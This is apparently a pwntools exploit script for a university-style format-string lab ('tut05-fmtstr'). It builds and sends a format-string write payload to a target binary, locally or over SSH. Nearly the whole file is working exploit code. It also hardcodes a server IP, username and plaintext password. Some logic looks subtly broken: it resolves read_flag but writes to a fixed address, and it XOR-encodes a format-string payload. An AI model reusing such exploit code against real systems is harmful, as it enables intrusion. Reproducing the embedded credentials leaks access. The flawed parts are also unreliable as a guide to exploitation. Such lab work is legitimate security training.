#!/usr/bin/env python2

import os
import re
import sys

from pwn import *

context.arch = "x86"
context.bits = 32
debug = False
exe = "./target"

ip = '52.201.10.159'
user = 'lab05'
myPassword = '9a6d5757'

p = process(exe)
if args['JAKE']:
    debug = True

if args['REMOTE']:
    s = ssh(user, ip, password=myPassword)
    p = s.process(exe, cwd='/home/lab05/tut05-fmtstr')

def writeToFile(payload):
    # Write shellcode to a binary
    f = open('shellcode', 'w')
    f.write(payload)
    f.close()

def exec_fmt(payload):
    p = process(exe)
    p.sendline(payload)
    return p.recvall()

def getOffset():
    return FmtStr(exec_fmt).offset

# Find our addresses
target_binary = ELF(exe)

# Get address of local function that we want to point to.
readFlagAddr = target_binary.symbols['read_flag']

# Get the address of the libc function in the GOT table
readAddr = target_binary.got['read']
strchrAddr = target_binary.got['strchr']
putsAddr = target_binary.got['puts']
exitAddr = target_binary.got['read']

# Get the address of the global variable that we need to overwrite.
#secretAddr = target_binary.symbols['secret']

writes = {0x080486b0: 0xdeadbeef}

# The garbage to fill the buffer
padding = "AAAA"

offset = getOffset()

# Create payload
payload = padding +fmtstr_payload(offset,
                                  writes, 
                                  #numbwritten=i,
                                  write_size='byte')
avoid = b'/bin/sh\xcc\xcd\x80'
payload = pwnlib.encoders.i386.xor.encode(payload, avoid)

log.success(payload)
# Make sure payload isn't too big. This was causing a segfault that took forever to debug.
'''
len_payload = len(payload)
if len_payload > 100:
    print "Length of payload is too big ({})".format(len_payload)
    raise SystemExit
else:
    log.success('Payload len: %d', len_payload)
'''

p = process(exe)
if debug == True:
    writeToFile(payload)
    script = '''
    b *0x804869a
    b *0x804866c
    r < <(cat shellcode)
    '''.format(payload)
    print script
    gdb.attach(p, script)
else:
    p.sendline(payload)
    print p.recvall()

p.close()
